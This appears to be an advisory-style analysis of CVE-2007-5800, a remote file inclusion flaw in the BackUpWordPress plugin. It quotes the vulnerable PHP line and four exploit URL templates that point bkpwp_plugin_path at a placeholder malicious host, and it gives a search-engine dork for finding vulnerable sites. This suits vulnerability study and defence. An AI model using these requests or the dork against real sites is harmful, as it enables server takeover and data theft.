Based on the provided content, here's a breakdown of the vulnerability:

**CVE ID:** CVE-2007-5800

**Root Cause of Vulnerability:**
The vulnerability stems from a lack of proper sanitization of the `bkpwp_plugin_path` variable within the BackUpWordPress plugin. This variable is directly used in a `require_once` statement, allowing an attacker to include arbitrary remote files.

**Weaknesses/Vulnerabilities Present:**
- **Remote File Inclusion (RFI):** The application directly includes files based on user-controlled input (`bkpwp_plugin_path`), leading to the possibility of executing arbitrary code from a remote server.

**Impact of Exploitation:**
- **Arbitrary Code Execution:** Successful exploitation allows an attacker to execute arbitrary PHP code on the server. This could lead to complete compromise of the web application and the server it's running on.
- **Data Theft:** By executing malicious code, an attacker can potentially access sensitive information stored on the server or within the application's database.
- **Defacement:** An attacker could modify website content to deface the site.
- **Denial of Service:** By including resource-intensive remote files, an attacker could potentially cause the web server to crash or become unresponsive.

**Attack Vectors:**
- **HTTP GET Request:** The attacker sends a crafted HTTP GET request to specific files within the `BackUp/Archive` directory, appending the malicious URL to the `bkpwp_plugin_path` parameter.

**Required Attacker Capabilities/Position:**
- **Network Access:** The attacker needs to be able to send HTTP requests to the vulnerable web server.
- **Vulnerable Application:** The attacker needs to identify a web server running the vulnerable BackUpWordPress plugin (version <= 0.4.2b).
- **Understanding of RFI:** The attacker needs an understanding of remote file inclusion vulnerabilities and the necessary payloads for exploitation.

**Technical Details:**

The vulnerable code snippet is:

```php
require_once $GLOBALS['bkpwp_plugin_path']."PEAR.php";
```

The exploit examples provided are:
```
http://[target]/_path]/plugins/BackUp/Archive.php?bkpwp_plugin_path=Shl3?

http://[target]/_path]/plugins/BackUp/Archive/Predicate.php?bkpwp_plugin_path=Shl3?

http://[target]/_path]/plugins/BackUp/Archive/Writer.php?bkpwp_plugin_path=Shl3?

http://[target]/_path]/plugins/BackUp/Archive/Reader.php?bkpwp_plugin_path=Shl3?
```
Where `Shl3` represents a malicious URL

This vulnerability is present in multiple files within the Archive directory, potentially increasing the attack surface. The provided "Dork" (`inurl:/plugins/BackUp`) can be used to identify vulnerable sites using search engines.
